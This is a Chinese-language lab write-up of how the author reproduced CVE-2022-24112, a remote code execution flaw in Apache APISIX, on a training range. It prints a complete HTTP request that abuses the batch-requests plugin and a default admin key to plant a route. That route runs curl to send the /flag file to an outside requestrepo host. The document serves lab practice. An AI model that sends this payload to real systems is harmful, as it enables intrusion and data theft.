---
title: CVE-2022-24112【SSRF RCE 待上传】
author: Ghost
date: 2023-12-10
categories:
  - ['春秋云境', '漏洞靶标']
  - 漏洞复现
tags:
  - 'SSRF RCE 待上传'
---

## 1. 漏洞介绍

Apache Apisix是美国阿帕奇（Apache）基金会的一个云原生的微服务API网关服务。该软件基于 OpenResty 和 etcd 来实现，具备动态路由和插件热加载，适合微服务体系下的 API 管理。 Apache APISIX中存在远程代码执行漏洞，该漏洞源于产品的batch-requests插件未对用户的批处理请求进行有效限制。攻击者可通过该漏洞绕过Admin API的IP限制，容易导致远程代码执行。

## 2. 漏洞复现

找到个[GitHub - twseptian/cve-2022-24112: Apache APISIX < 2.12.1 Remote Code Execution and Docker Lab](https://github.com/twseptian/cve-2022-24112)  反弹 shell 的 poc，测试没成功，还是手动来吧……操作如下

在 [Dashboard - requestrepo.com](http://requestrepo.com/#/requests) 申请个新的 url，burp suite抓包改包

```http
POST http://eci-2zei2boyfnn3bvthzalj.cloudeci1.ichunqiu.com:9080/apisix/batch-requests HTTP/1.1
Host: eci-2zei2boyfnn3bvthzalj.cloudeci1.ichunqiu.com:9080
Cache-Control: max-age=0
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1696947092; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1696952533; SL_G_WPT_TO=zh; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1
Connection: close
Content-Length: 483


{"headers":{"Content-Type":"application/json", "X-REAL-IP": "127.0.0.1"}, "timeout": 500, "pipeline":[{"method": "PUT", "path": "/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1", "body":"{\r\n \"name\": \"test\", \"method\": [\"GET\"],\r\n \"uri\": \"/isok\", \r\n \"upstream\":{\"type\":\"roundrobin\",\"nodes\":{\"httpbin.org:80\":1}}\r\n,\r\n\"filter_func\": \"function(vars) os.execute('curl -d @/flag y0e3ope6.requestrepo.com'); return true end\"}"}]}

```

![1.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310110925723.png)

访问 isok 触发

![2.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310110925243.png)

拿到 flag

![3.png](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202310110926464.png)
